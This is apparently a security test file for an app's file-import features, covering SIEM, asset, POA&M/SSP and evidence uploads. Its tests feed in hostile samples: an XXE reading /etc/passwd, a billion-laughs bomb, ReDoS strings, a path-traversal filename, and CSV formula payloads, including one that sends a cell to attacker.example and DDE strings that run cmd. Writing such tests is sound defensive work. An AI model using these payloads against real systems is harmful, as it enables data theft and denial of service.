"""H4 import-attack hunt — every way data enters Athorize from a file.

Each ingestion path (SIEM/scanner parsers, asset-source imports, POA&M/SSP
migration, evidence upload, branding logo, backup restore, custom-framework
backup coverage, threat-feed parsers) is exercised with:
  * a realistic GOOD file modeled on the vendor's real export, checked END TO
    END through the API (format detected, right count/severity/system, visible
    in the list endpoint, idempotent on re-import);
  * edge cases (empty, header-only, BOM, CRLF, encodings, long fields, dupes);
  * hostile input (XXE / billion laughs, tar slip / symlink / bomb, crafted
    DB, formula payloads that are later exported, malformed JSON shapes,
    ReDoS candidates).

Tests assert CORRECT behaviour. Where the app is currently wrong the test is
marked ``xfail(strict=True, reason="IMPORTS-<n>: ...")`` — the fix team flips
it to a normal test once fixed (strict=True makes an unexpected pass fail the
run, so a fix can never land silently without updating the marker).

All fixtures are synthetic (Acme / example.com / RFC 5737 + 3849 addresses).
Huge / bomb inputs are generated in-test, never committed.
"""
from __future__ import annotations

import os

# Harness guard (pre-existing race, not app behaviour): every TestClient
# lifespan starts a history snapshot in a worker THREAD on the app engine
# against ./test.db, while tests/conftest.py deletes and recreates that file
# per test. Whichever later test loses the race fails in setup with SQLite
# "locking protocol" (seen in tests/test_backup.py once this module shifted
# timings). Collection-time default for the whole session; an explicit
# operator value still wins. Proper home: tests/conftest.py.
os.environ.setdefault("HISTORY_SNAPSHOT_INTERVAL_HOURS", "0")

import base64
import csv
import io
import json
import shutil
import sqlite3
import struct
import tarfile
import time
import zipfile
import zlib
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from config import settings
from database import get_db
from main import app
from models import Control, EvidenceArtifact, Finding, FrameworkActivation, ITAsset, System

FIX = Path(__file__).parent / "fixtures" / "imports"
FW = "hunt-fw"


# ---------------------------------------------------------------------------
# Harness
# ---------------------------------------------------------------------------

class Ctx:
    def __init__(self, client: TestClient, db, org, system):
        self.c = client
        self.db = db
        self.org = org
        self.system = system

    # -- SIEM -------------------------------------------------------------
    def siem(self, name: str, content, fmt: str = "", confirm: bool = False, framework_id: str = FW):
        if isinstance(content, str):
            content = content.encode("utf-8")
        url = "/api/siem/import/confirm" if confirm else "/api/siem/import"
        return self.c.post(url, data={
            "system_id": str(self.system.id), "framework_id": framework_id, "format_override": fmt,
        }, files={"file": (name, io.BytesIO(content), "application/octet-stream")})

    def findings(self) -> list[dict]:
        r = self.c.get(f"/api/findings?system_id={self.system.id}")
        assert r.status_code == 200, r.text
        return r.json()

    # -- assets -----------------------------------------------------------
    def assets_import(self, name: str, content, source: str = "", confirm: bool = False):
        if isinstance(content, str):
            content = content.encode("utf-8")
        url = "/api/asset-import/import/confirm" if confirm else "/api/asset-import/import"
        return self.c.post(url, data={"system_id": str(self.system.id), "source_override": source},
                           files={"file": (name, io.BytesIO(content), "text/csv")})

    def assets(self) -> list[dict]:
        r = self.c.get(f"/api/it-assets?system_id={self.system.id}")
        assert r.status_code == 200, r.text
        return r.json()

    # -- migration --------------------------------------------------------
    def migrate(self, kind: str, name: str, content, commit: bool):
        if isinstance(content, str):
            content = content.encode("utf-8")
        return self.c.post(f"/api/migration/{kind}", data={
            "system_id": str(self.system.id), "framework_id": FW, "commit": "true" if commit else "false",
        }, files={"file": (name, io.BytesIO(content), "text/csv")})

    # -- evidence ---------------------------------------------------------
    def upload_evidence(self, name: str, content: bytes, **form):
        data = {"system_id": str(self.system.id), "control_ids": '["HUNT-1"]',
                "framework_ids": json.dumps([FW])}
        data.update({k: str(v) for k, v in form.items()})
        return self.c.post("/api/evidence/upload", data=data,
                           files={"file": (name, io.BytesIO(content), "application/octet-stream")})


@pytest.fixture
def H(db, seeded):
    """Logged-in admin client. raise_server_exceptions=False so an unhandled
    exception surfaces as the 500 a real user would get (not a test crash)."""
    def override():
        yield db

    app.dependency_overrides[get_db] = override
    with TestClient(app, raise_server_exceptions=False) as c:
        r = c.post("/api/auth/login", json={"username": "testadmin", "password": "testpass1234!"})
        assert r.status_code == 200
        c.headers["X-CSRF-Token"] = c.cookies.get("universal_csrf") or ""
        system = System(organization_id=seeded["org"].id, name="Hunt System", acronym="HUNT")
        db.add(system)
        db.add(FrameworkActivation(organization_id=seeded["org"].id, framework_id=FW, is_active=True))
        for i, title in ((1, "Access enforcement"), (2, "Audit retention"), (3, "Encryption at rest")):
            db.add(Control(framework_id=FW, control_id=f"HUNT-{i}", family="HU",
                           family_name="Hunt", title=title))
        db.commit()
        yield Ctx(c, db, seeded["org"], system)
    app.dependency_overrides.clear()


def fixture_bytes(*parts: str) -> bytes:
    return FIX.joinpath(*parts).read_bytes()


# ===========================================================================
# 1. SIEM / scanner imports — good files, end to end
# ===========================================================================

GOOD_SIEM = [
    # (fixture, expected detected format, expected severities in file order)
    ("splunk_notables.csv", "splunk_csv", ["HIGH", "CRITICAL", "LOW"]),
    ("eve.json", "suricata_eve", ["CRITICAL", "HIGH"]),
    ("fast.log", "snort_fast", ["CRITICAL", "HIGH", "MEDIUM"]),
    ("yara_matches.json", "yara_json", ["MEDIUM", "CRITICAL"]),
    ("nessus_export.csv", "nessus_csv", ["CRITICAL", "MEDIUM", "HIGH"]),
    ("cef_events.log", "generic_cef", ["CRITICAL", "HIGH", "MEDIUM"]),
    ("sentinel_alerts.csv", "sentinel_csv", ["HIGH", "MEDIUM", "LOW"]),
    ("falcon_detections.csv", "crowdstrike_csv", ["CRITICAL", "HIGH"]),
    ("elastic_alerts.ndjson", "elastic_json", ["HIGH", "CRITICAL"]),
    ("wazuh_alerts.json", "wazuh_json", ["LOW", "MEDIUM", "CRITICAL"]),
    ("guardduty_findings.json", "guardduty_json", ["HIGH", "MEDIUM", "LOW"]),
    ("syslog5424.log", "syslog_rfc5424", ["CRITICAL", "HIGH", "MEDIUM"]),
    ("qualys_scan.csv", "qualys_csv", ["CRITICAL", "HIGH", "LOW"]),
    # The third row ("Nessus Scan Information", Severity=Info) is an informational
    # plugin and is skipped since R2USER-5 — it used to import as a LOW finding.
    ("tenable_sc.csv", "tenable_csv", ["CRITICAL", "HIGH"]),
    ("gvm_report.xml", "openvas_xml", ["HIGH", "MEDIUM", "LOW"]),
    ("winevent_ps7.csv", "winevent_csv", ["LOW", "HIGH", "MEDIUM"]),
]


@pytest.mark.parametrize("fname,fmt,sevs", GOOD_SIEM, ids=[g[0] for g in GOOD_SIEM])
def test_siem_good_file_end_to_end(H, fname, fmt, sevs):
    raw = fixture_bytes("siem", fname)
    n = len(sevs)

    pv = H.siem(fname, raw)
    assert pv.status_code == 200, pv.text
    body = pv.json()
    assert body["format"] == fmt
    assert body["total_parsed"] == n and body["new_count"] == n and body["duplicate_count"] == 0
    assert [p["severity"] for p in body["preview"]] == sevs

    cf = H.siem(fname, raw, confirm=True)
    assert cf.status_code == 200, cf.text
    assert cf.json()["created"] == n

    rows = H.findings()
    assert len(rows) == n
    assert all(r["system_id"] == H.system.id and r["organization_id"] == H.org.id for r in rows)
    assert all(r["framework_id"] == FW and r["status"] == "OPEN" for r in rows)
    assert sorted(r["severity"] for r in rows) == sorted(sevs)
    assert all(r["title"] for r in rows)

    # Re-importing the identical file is idempotent.
    again = H.siem(fname, raw, confirm=True)
    assert again.status_code == 200
    assert again.json()["created"] == 0 and again.json()["skipped"] == n
    assert len(H.findings()) == n

    # The import is visible in the history panel.
    hist = H.c.get("/api/siem/import/history").json()
    assert hist and fmt in hist[0]["summary"]


def test_siem_network_metadata_survives(H):
    """Ports / IPs / CVE land in extra_data where the UI reads them."""
    H.siem("gvm_report.xml", fixture_bytes("siem", "gvm_report.xml"), confirm=True)
    ssh = next(f for f in H.findings() if f["title"].startswith("OpenSSH"))
    ed = ssh["extra_data"]
    assert ed["dst_ip"] == "10.0.0.8" and ed["dst_port"] == 22 and ed["protocol"] == "tcp"
    assert ed["cve"] == "CVE-2023-38408"


# ---------------------------------------------------------------------------
# 1b. SIEM edge cases
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("name,content", [
    ("empty.csv", b""),
    ("empty.json", b""),
    ("empty.log", b""),
    ("empty.xml", b""),
    ("header_only.csv", b'"Plugin ID","CVE","Risk","Host","Port","Name"\n'),
    ("whitespace.json", b"\n\n   \n"),
    ("not_xml.xml", b"<html><body>hello</body></html>"),
], ids=["empty-csv", "empty-json", "empty-log", "empty-xml", "header-only", "whitespace-json", "html-as-xml"])
def test_siem_bad_files_give_clear_4xx(H, name, content):
    r = H.siem(name, content, confirm=True)
    assert 400 <= r.status_code < 500, (r.status_code, r.text)
    assert r.json().get("detail")
    assert H.findings() == []


def test_siem_unknown_format_override_rejected(H):
    r = H.siem("x.csv", fixture_bytes("siem", "splunk_notables.csv"), fmt="no_such_format", confirm=True)
    assert r.status_code == 422


def test_siem_oversize_upload_rejected(H):
    big = b"alert_name,severity\n" + b"x,high\n" * (17 * 1024 * 1024 // 7)
    r = H.siem("big.csv", big)
    assert r.status_code == 413


def test_siem_crlf_and_extra_columns(H):
    content = ("alert_name,severity,src_ip,dst_ip,_time,unexpected_col\r\n"
               "Brute force,high,203.0.113.1,10.0.0.1,2026-10-20T09:00:00Z,zzz\r\n"
               "Port scan,low,203.0.113.2,10.0.0.1,2026-10-20T09:01:00Z,yyy\r\n")
    r = H.siem("crlf.csv", content, confirm=True)
    assert r.status_code == 200 and r.json()["created"] == 2
    assert {f["title"] for f in H.findings()} == {"Brute force", "Port scan"}


def test_siem_ipv6_and_unicode_in_json_formats(H):
    content = json.dumps({"timestamp": "2026-10-20T09:00:00Z", "event_type": "alert",
                          "src_ip": "2001:db8::1", "dest_ip": "2001:db8::2", "proto": "TCP",
                          "alert": {"signature": "ET POLICY Ünïcödé — test", "signature_id": 1, "severity": 2}})
    r = H.siem("eve.json", content, confirm=True)
    assert r.status_code == 200 and r.json()["created"] == 1
    f = H.findings()[0]
    assert f["title"] == "ET POLICY Ünïcödé — test" and f["extra_data"]["src_ip"] == "2001:db8::1"


def test_cef_severity_follows_cef_spec(H):
    # ArcSight CEF spec: 0-3 Low, 4-6 Medium, 7-8 High, 9-10 Very-High;
    # string values Unknown/Low/Medium/High/Very-High.
    expected = {"1": "LOW", "2": "LOW", "3": "LOW", "4": "MEDIUM", "6": "MEDIUM",
                "8": "HIGH", "9": "CRITICAL", "Very-High": "CRITICAL"}
    lines = "".join(f"CEF:0|Acme|IDS|1.0|{i}|sev {s}|{s}|src=10.0.0.{i} rt={i}\n"
                    for i, s in enumerate(expected))
    r = H.siem("cef.log", lines, confirm=True)
    assert r.status_code == 200
    got = {f["title"].split(" ", 1)[1]: f["severity"] for f in H.findings()}
    assert got == expected


def test_suricata_alerts_after_5000_other_events_are_imported(H):
    flow = '{"timestamp":"2026-10-20T09:00:00Z","event_type":"flow","src_ip":"10.0.0.1","dest_ip":"10.0.0.2"}\n'
    alerts = "".join(
        json.dumps({"timestamp": f"2026-10-20T10:00:0{i}Z", "event_type": "alert", "src_ip": "203.0.113.9",
                    "dest_ip": "10.0.0.8", "alert": {"signature": f"ET TEST {i}", "signature_id": 100 + i,
                                                     "severity": 2}}) + "\n" for i in range(3))
    r = H.siem("eve.json", flow * 6000 + alerts, confirm=True)
    assert r.status_code == 200, r.text
    assert r.json()["created"] == 3


def test_siem_row_cap_is_reported(H):
    content = "alert_name,_time,src_ip\n" + "".join(f"Alert {i},2026-10-20T09:{i // 60 % 60:02d}:{i % 60:02d}Z,10.0.{i // 250}.{i % 250}\n"
                                                    for i in range(5001))
    r = H.siem("big.csv", content)
    assert r.status_code == 200
    body = r.json()
    assert body["total_parsed"] == 5001 or body.get("truncated") is True


def test_nessus_multi_cve_rows_do_not_multiply_findings(H):
    hdr = '"Plugin ID","CVE","CVSS v2.0 Base Score","Risk","Host","Protocol","Port","Name","Synopsis"\n'
    rows = "".join(f'"97833","CVE-2017-014{i}","9.3","Critical","10.0.0.5","tcp","445",'
                   f'"MS17-010: Security Update for Microsoft Windows SMB Server","Affected."\n' for i in range(3, 9))
    pv = H.siem("scan.csv", hdr + rows)
    assert pv.json()["new_count"] == 1
    r = H.siem("scan.csv", hdr + rows, confirm=True)
    assert r.json()["created"] == 1
    assert len(H.findings()) == 1


def test_bom_does_not_lose_first_column(H):
    raw = b"\xef\xbb\xbf" + fixture_bytes("siem", "nessus_export.csv")
    r = H.siem("scan.csv", raw, confirm=True)
    assert r.status_code == 200
    assert {f["extra_data"]["plugin_id"] for f in H.findings()} == {"97833", "51192", "42873"}


def test_bom_does_not_make_new_events_look_like_duplicates(H):
    hdr = "﻿_time,alert_name,severity,src_ip,dst_ip\n"
    first = hdr + "2026-10-20T09:00:00Z,Brute force,high,203.0.113.1,10.0.0.1\n"
    later = hdr + "2026-10-21T09:00:00Z,Brute force,high,203.0.113.1,10.0.0.1\n"
    assert H.siem("monday.csv", first, confirm=True).json()["created"] == 1
    r = H.siem("tuesday.csv", later, confirm=True)
    assert r.json()["created"] == 1  # a different event (different _time)
    assert len(H.findings()) == 2


def test_qualys_report_with_metadata_preamble(H):
    pre = ('"Scan Results","scan/1761000000.12345"\n'
           '"Acme Industrial Corp","1 Example Way","Springfield","Example State","US","00000"\n'
           '"Launch Date","Active Hosts","Total Hosts","Type","Status"\n'
           '"10/20/2026 09:00:00","2","2","On demand","Finished"\n\n')
    body = fixture_bytes("siem", "qualys_scan.csv").decode()
    r = H.siem("scan.csv", pre + body, confirm=True)
    assert r.status_code == 200, r.text
    assert r.json()["format"] == "qualys_csv" and r.json()["created"] == 3


def test_winevent_export_csv_with_type_line(H):
    raw = b"#TYPE System.Diagnostics.Eventing.Reader.EventLogRecord\r\n" + fixture_bytes("siem", "winevent_ps7.csv")
    r = H.siem("events.csv", raw, confirm=True)
    assert r.status_code == 200, r.text
    assert r.json()["created"] == 3


def test_sentinel_timestamp_kept(H):
    H.siem("alerts.csv", fixture_bytes("siem", "sentinel_alerts.csv"), confirm=True)
    assert all(f["extra_data"]["timestamp"] for f in H.findings())


def test_snort_ipv6_alert_imported(H):
    line = ("10/20-09:15:02.123456  [**] [1:2001219:20] ET SCAN Potential SSH Scan [**] "
            "[Classification: Attempted Information Leak] [Priority: 2] {TCP} 2001:db8::10:52000 -> 2001:db8::20:22\n")
    r = H.siem("fast.log", line, confirm=True)
    assert r.status_code == 200 and r.json()["created"] == 1


def test_yara_large_array_autodetected(H):
    matches = [{"rule": f"Rule_{i}", "tags": ["malware"], "file": f"/srv/share/file_{i}.bin",
                "strings": ["$a"]} for i in range(40)]
    r = H.siem("yara.json", json.dumps(matches), confirm=True)
    assert r.status_code == 200, r.text
    assert r.json()["format"] == "yara_json" and r.json()["created"] == 40


@pytest.mark.parametrize("encoding", ["utf-16", "latin-1"])
def test_siem_non_utf8_encodings(H, encoding):
    text = "alert_name,severity,src_ip\nConnexion refusée,high,10.0.0.1\n"
    r = H.siem("alerts.csv", text.encode(encoding), confirm=True)
    assert r.status_code == 200, r.text
    assert H.findings()[0]["title"] == "Connexion refusée"


HOSTILE_JSON = [
    ("wazuh_json", "alerts.json", '{"rule":{"level":3,"description":"ok","id":"1"},"agent":{"name":"a"}}\n123\n'),
    ("wazuh_json", "alerts.json", '{"rule":"x","level":1,"agent":{}}\n'),
    ("wazuh_json", "alerts.json", '{"rule":{"level":3,"description":"d"},"data":"s","agent":{}}\n'),
    ("elastic_json", "alerts.ndjson", '{"@timestamp":"t","event":"signal","message":"m"}\n'),
    ("elastic_json", "alerts.ndjson", '{"@timestamp":"t","rule":{"name":"r"},"host":"h1","event":{}}\n'),
    ("guardduty_json", "gd.json", '{"Findings":[{"Title":"t","Service":"x"}]}'),
    ("guardduty_json", "gd.json", '{"Findings":[{"Title":"t","Resource":"x"}]}'),
    ("yara_json", "y.json", '[{"rule":"r","tags":[1,2]}]'),
]


@pytest.mark.parametrize("fmt,name,content", HOSTILE_JSON, ids=[f"{h[0]}-{i}" for i, h in enumerate(HOSTILE_JSON)])
def test_siem_malformed_json_shapes_never_500(H, fmt, name, content):
    r = H.siem(name, content, fmt=fmt, confirm=True)
    assert r.status_code != 500, r.text
    assert r.status_code in (200, 422)


CSV_BREAKERS = {
    # >131072-char field (e.g. Nessus "Plugin Output", a long POA&M narrative)
    "long-field": lambda hdr, row: hdr + "\n" + row.replace("LONG", "A" * 200_000) + "\n",
    # bare-CR line endings (Excel for Mac "CSV (Macintosh)")
    "cr-only": lambda hdr, row: hdr + "\r" + row.replace("LONG", "short") + "\r",
    # binary junk uploaded with a .csv name
    "binary": lambda hdr, row: (bytes(range(256)) * 4).decode("latin-1"),
}
CSV_TARGETS = {
    "siem": ('"Plugin ID","Risk","Host","Port","Name","Plugin Output"', '"1","High","10.0.0.1","443","x","LONG"'),
    "assets": ("Computer Name,Operating System,Notes", "WS-1,Windows 11,LONG"),
    "poam": ("Weakness,Description", "Long one,LONG"),
}


@pytest.mark.parametrize("target", list(CSV_TARGETS))
@pytest.mark.parametrize("breaker", list(CSV_BREAKERS))
def test_csv_parser_errors_never_500(H, target, breaker):
    hdr, row = CSV_TARGETS[target]
    content = CSV_BREAKERS[breaker](hdr, row)
    data = content.encode("latin-1" if breaker == "binary" else "utf-8")
    if target == "siem":
        r = H.siem("scan.csv", data, fmt="nessus_csv", confirm=True)
    elif target == "assets":
        r = H.assets_import("inv.csv", data, source="tanium_csv", confirm=True)
    else:
        r = H.migrate("poam", "poam.csv", data, commit=True)
    assert r.status_code != 500, r.text
    assert r.status_code in (200, 413, 422)


# ---------------------------------------------------------------------------
# 1c. Hostile XML (OpenVAS) — XXE / billion laughs must be inert
# ---------------------------------------------------------------------------

XXE = """<?xml version="1.0"?>
<!DOCTYPE report [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<report><results><result><name>&xxe;</name><host>10.0.0.1</host><threat>High</threat></result></results></report>"""

BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<report><results><result><name>&lol9;</name><threat>High</threat></result></results></report>"""


@pytest.mark.parametrize("payload", [XXE, BILLION_LAUGHS], ids=["xxe", "billion-laughs"])
def test_openvas_xml_entities_are_inert(H, payload):
    t = time.time()
    r = H.siem("report.xml", payload, confirm=True)
    assert time.time() - t < 5
    assert r.status_code == 422
    assert H.findings() == []


@pytest.mark.parametrize("payload", [XXE, BILLION_LAUGHS], ids=["xxe", "billion-laughs"])
def test_feed_rss_parsers_reject_entities(payload):
    from services.feeds_aa import AaFeedError, _parse_rss
    from services.feeds_custom import CustomFeedError, parse_custom_rss
    rss = payload.replace("report", "rss").replace("results", "channel").replace("result", "item").replace("name", "title")
    with pytest.raises(AaFeedError):
        _parse_rss(rss)
    with pytest.raises(CustomFeedError):
        parse_custom_rss(rss, "hunt")


# ---------------------------------------------------------------------------
# 1d. ReDoS candidates — line regexes must stay linear on adversarial input
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("fmt,payload", [
    ("syslog_rfc5424", "<1>1 " + "a " * 200_000),
    ("syslog_rfc5424", "<1>1 - - - - - " + "[" * 200_000),
    ("generic_cef", "CEF:0|" + "|" * 5 + "a=b " * 200_000),
    ("generic_cef", "CEF:" + "0|" * 200_000),
    ("generic_cef", "CEF:0|a|b|c|d|e|5|" + "k" * 300_000 + "=v"),
    ("snort_fast", "01/01-00:00:00.1 [**] [1:1:1] " + "[**] " * 100_000),
    ("snort_fast", "01/01-00:00:00.1 [**] [1:1:1] x [**] " + "[Classification: " * 50_000),
])
def test_line_regexes_are_linear(fmt, payload):
    from services.siem_import import parse_file
    t = time.time()
    parse_file(payload, fmt)
    assert time.time() - t < 2.0


def test_large_but_legal_siem_file_is_fast(H):
    """~15 MiB Splunk export (capped at 5000 rows) — preview must stay interactive."""
    row = "Brute force {i},high,203.0.113.1,10.0.0.1,2026-10-20T09:00:00Z," + "d" * 2900 + "\n"
    content = "alert_name,severity,src_ip,dst_ip,_time,description\n" + "".join(row.format(i=i) for i in range(5000))
    assert len(content) < 16 * 1024 * 1024
    t = time.time()
    r = H.siem("big.csv", content)
    assert r.status_code == 200
    assert time.time() - t < 15


# ===========================================================================
# 2. CSV formula payloads that round-trip to an export
# ===========================================================================

FORMULAS = ['=HYPERLINK("https://attacker.example/?x="&A1,"click")', "+cmd|' /C calc'!A0",
            "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)*cmd|' /C calc'!A0"]


def test_imported_formula_titles_are_neutralised_in_findings_export(H):
    content = "alert_name,severity,_time\n" + "".join(
        f'"{v.replace(chr(34), chr(34) * 2)}",high,2026-10-20T09:00:0{i}Z\n' for i, v in enumerate(FORMULAS))
    assert H.siem("evil.csv", content, confirm=True).json()["created"] == len(FORMULAS)
    r = H.c.get(f"/api/reports/findings?system_id={H.system.id}")
    rows = list(csv.DictReader(io.StringIO(r.text)))
    assert len(rows) == len(FORMULAS)
    assert all(not row["title"].startswith(("=", "+", "-", "@")) for row in rows)


def test_ssp_responsible_party_formula_neutralised_in_punch_list(H):
    ssp = ('Control ID,Implementation Status,Implementation Narrative,Responsible Role\n'
           'HUNT-2,Partially Implemented,Retention not yet one year.,"=HYPERLINK(""https://attacker.example"",""x"")"\n')
    assert H.migrate("ssp", "ssp.csv", ssp, commit=True).json()["written"] == 1
    r = H.c.get(f"/api/inspection/prep/punch-list.csv?framework_id={FW}&system_ids={H.system.id}")
    assert r.status_code == 200
    owners = [row["Owner"] for row in csv.DictReader(io.StringIO(r.text))]
    assert owners and all(not o.startswith(("=", "+", "-", "@")) for o in owners)


# ===========================================================================
# 3. Asset-source imports (Tanium / Cisco ISE)
# ===========================================================================

@pytest.mark.parametrize("fname,source,expected", [
    ("tanium_inventory.csv", "tanium_csv", {
        "WS-FIN-04.example.com": ("WINDOWS", "LAPTOP", "10.20.5.40"),
        "APP-SRV-09.example.com": ("LINUX", "SERVER", "10.10.1.9"),
        "mac-des-02.example.com": ("MACOS", "LAPTOP", "2001:db8::42"),
    }),
    ("ise_endpoints.csv", "cisco_ise_csv", {
        "LT-ENG-12": ("WINDOWS", "WORKSTATION", "192.168.4.21"),
        "DD:EE:FF:44:55:66": (None, "MOBILE", "192.168.4.55"),
        "PRN-3F-01": (None, "PRINTER", "192.168.4.90"),
    }),
])
def test_asset_import_good_file_end_to_end(H, fname, source, expected):
    raw = fixture_bytes("assets", fname)
    pv = H.assets_import(fname, raw)
    assert pv.status_code == 200, pv.text
    assert pv.json()["source"] == source and pv.json()["new_count"] == 3 and pv.json()["error_count"] == 0

    cf = H.assets_import(fname, raw, confirm=True)
    assert cf.status_code == 200 and cf.json()["created"] == 3

    got = {a["asset_name"]: (a["os_family"], a["asset_role"], a["ip_address"]) for a in H.assets()}
    assert got == expected
    assert all(a["system_id"] == H.system.id for a in H.assets())

    again = H.assets_import(fname, raw, confirm=True)
    assert again.json()["created"] == 0 and again.json()["skipped"] == 3
    assert len(H.assets()) == 3


@pytest.mark.parametrize("content", [b"", b"Computer Name,Operating System\n", b"foo,bar\n1,2\n"])
def test_asset_import_bad_files_4xx(H, content):
    r = H.assets_import("inv.csv", content, confirm=True)
    assert 400 <= r.status_code < 500
    assert H.assets() == []


def test_asset_import_in_file_duplicates_collapse(H):
    raw = fixture_bytes("assets", "ise_endpoints.csv")
    lines = raw.decode().splitlines()
    dup = "\n".join(lines + [lines[1].replace("LT-ENG-12", "lt-eng-12-renamed")]) + "\n"  # same MAC
    r = H.assets_import("ise.csv", dup, confirm=True)
    assert r.json()["created"] == 3 and r.json()["skipped"] == 1


def test_asset_import_tanium_with_bom(H):
    raw = b"\xef\xbb\xbf" + fixture_bytes("assets", "tanium_inventory.csv")
    r = H.assets_import("inv.csv", raw, confirm=True)
    assert r.status_code == 200, r.text
    assert r.json()["created"] == 3


# ===========================================================================
# 4. Migration — POA&M / SSP CSV
# ===========================================================================

def test_poam_generic_end_to_end(H):
    # The fixture's control ids must exist in the catalog, or the import reports them (R2USER-7).
    for cid in ("AC-2", "AU-11", "SC-8"):
        H.db.add(Control(framework_id=FW, control_id=cid, family=cid[:2], family_name=cid[:2], title=cid))
    H.db.commit()
    raw = fixture_bytes("migration", "poam_generic.csv")
    pv = H.migrate("poam", "poam.csv", raw, commit=False)
    # The closed row has no completion date: since R2DATA-11 it is recorded as
    # completed on the import date, and the preview says so (the only issue).
    assert pv.status_code == 200 and pv.json()["total"] == 3
    assert [i for i in pv.json()["issues"] if "no completion date" not in i] == []
    cm = H.migrate("poam", "poam.csv", raw, commit=True)
    assert cm.json()["created"] == 3
    got = {f["title"]: (f["severity"], f["status"], f["control_id"], f["due_date"]) for f in H.findings()}
    assert got == {
        "Stale privileged accounts": ("HIGH", "OPEN", "AC-2", "2026-12-31"),
        "Missing audit log retention": ("MEDIUM", "IN_PROGRESS", "AU-11", "2027-01-15"),
        "Outdated TLS configuration": ("LOW", "CLOSED", "SC-8", "2026-11-15"),
    }
    again = H.migrate("poam", "poam.csv", raw, commit=True)
    assert again.json()["created"] == 0 and again.json()["duplicates"] == 3


def test_poam_latin1_and_bom(H):
    text = "Weakness,Severity\nAccès non autorisé,High\n"
    assert H.migrate("poam", "a.csv", text.encode("latin-1"), commit=True).json()["created"] == 1
    assert H.migrate("poam", "b.csv", b"\xef\xbb\xbf" + "Weakness,Severity\nSecond,Low\n".encode(), commit=True).json()["created"] == 1
    assert {f["title"] for f in H.findings()} == {"Accès non autorisé", "Second"}


def test_poam_bad_files(H):
    assert H.migrate("poam", "e.csv", b"", commit=True).status_code == 422
    r = H.migrate("poam", "x.csv", b"foo,bar\n1,2\n", commit=False)
    assert r.status_code == 200 and r.json()["total"] == 0 and r.json()["issues"]


def test_poam_fedramp_template_columns(H):
    raw = fixture_bytes("migration", "poam_fedramp_template.csv")
    assert H.migrate("poam", "fedramp.csv", raw, commit=True).json()["created"] == 3
    got = {f["title"]: (f["severity"], f["control_id"]) for f in H.findings()}
    assert got == {
        "Stale privileged accounts": ("HIGH", "AC-2"),
        "Critical OpenSSH vulnerability": ("CRITICAL", "RA-5"),
        "Deprecated TLS": ("LOW", "SC-8"),
    }


def test_ssp_end_to_end_and_never_clobbers(H):
    raw = fixture_bytes("migration", "ssp_workbook.csv")
    pv = H.migrate("ssp", "ssp.csv", raw, commit=False)
    assert pv.json()["matched"] == 3 and pv.json()["unknown_controls"] == 0
    assert H.migrate("ssp", "ssp.csv", raw, commit=True).json()["written"] == 3
    again = H.migrate("ssp", "ssp.csv", raw, commit=True)
    assert again.json()["written"] == 0 and again.json()["already_assessed"] == 3


# ===========================================================================
# 5. API bulk-import (JSON rows) — partial / silent truncation
# ===========================================================================

def test_bulk_import_does_not_silently_drop_rows_after_error_cap(H):
    good = [{"title": f"ok {i}", "framework_id": FW, "severity": "LOW"} for i in range(5)]
    bad = [{"title": f"bad {i}", "framework_id": FW, "severity": "SEVERE"} for i in range(500)]
    late = [{"title": f"late {i}", "framework_id": FW, "severity": "HIGH"} for i in range(5)]
    r = H.c.post(f"/api/findings/bulk-import/{H.system.id}", json={"rows": good + bad + late, "commit": True})
    assert r.status_code == 200
    body = r.json()
    assert body["committed"] == 10 or body.get("truncated") is True


# ===========================================================================
# 6. Evidence upload
# ===========================================================================

def test_evidence_traversal_filename_is_contained(H):
    r = H.upload_evidence("../../../../tmp/evil.pdf", b"%PDF-1.4 hunt")
    assert r.status_code == 200, r.text
    stored = settings.evidence_dir / r.json()["file_path"]
    assert stored.resolve().is_relative_to(settings.evidence_dir.resolve())
    assert stored.read_bytes() == b"%PDF-1.4 hunt"
    assert "/" not in Path(r.json()["file_path"]).name


@pytest.mark.parametrize("name", ["page.html", "run.exe", "noext", "x.pdf.php"])
def test_evidence_disallowed_extensions(H, name):
    r = H.upload_evidence(name, b"<script>alert(1)</script>")
    assert r.status_code in (400, 415, 422)


def test_uploaded_evidence_is_archived_in_audit_binder(H):
    up = H.upload_evidence("access-policy.pdf", b"%PDF-1.4 access policy")
    assert up.status_code == 200
    r = H.c.get(f"/api/reports/audit-binder?system_id={H.system.id}&framework_id={FW}")
    assert r.status_code == 200
    names = zipfile.ZipFile(io.BytesIO(r.content)).namelist()
    assert any(n.startswith("evidence/") and "access-policy" in n for n in names), names


def test_evidence_malformed_control_ids_rejected_or_harmless(H):
    r = H.upload_evidence("log.txt", b"hello", control_ids="[1, 2]")
    assert r.status_code in (200, 422)
    exp = H.c.get(f"/api/reports/evidence?system_id={H.system.id}")
    binder = H.c.get(f"/api/reports/audit-binder?system_id={H.system.id}&framework_id={FW}")
    assert exp.status_code == 200 and binder.status_code == 200


def test_evidence_huge_expiration_days(H):
    r = H.upload_evidence("log.txt", b"hello", expiration_days=10**9)
    assert r.status_code == 422


# ===========================================================================
# 7. Branding logo
# ===========================================================================

def _png(width: int = 1, height: int = 1, bitdepth: int = 8, color: int = 0) -> bytes:
